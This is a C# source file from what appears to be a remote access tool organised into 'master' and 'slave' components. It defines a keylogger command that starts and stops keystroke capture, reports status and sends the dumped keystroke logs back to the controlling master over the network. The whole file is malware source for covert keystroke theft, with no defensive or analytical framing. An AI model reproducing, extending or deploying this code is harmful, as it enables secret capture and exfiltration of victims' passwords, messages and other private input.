using System.Collections.Generic;
using Shared;
using Slave.Commands.Core;

namespace Slave.Commands.KeyLogger
{
    internal class KeyLoggerCommand : ICommand
    {
        public string name { get; } = "keylogger";

        KeyLoggerManager keyLoggerManager { get; set; }

        public void GetKeyLoggerManagerInstance(KeyLoggerManager manager) => keyLoggerManager = manager;
        

        public void Process(List<string> args)
        {
            switch (args[0])
            {
                case "start":
                    StartKeylogger();
                    break;
                case "stop":
                    StopKeylogger();
                    break;
                case "status":
                    SendKeyloggerStatusToMaster();
                    break;
                case "dump":
                    SendKeyLogsToMaster();
                    break;
            }
        }

        void StartKeylogger() => keyLoggerManager.StartListening();

        void StopKeylogger() => keyLoggerManager.StopListening();

        void SendKeyloggerStatusToMaster() =>
            SlaveCommandsManager.networkManager.WriteLine(keyLoggerManager.GetStatus() ? "The keylogger is running" : "The keylogger isn't started");

        void SendKeyLogsToMaster() =>
            SlaveCommandsManager.networkManager.WriteLine(keyLoggerManager.DumpLogs());
    }
}
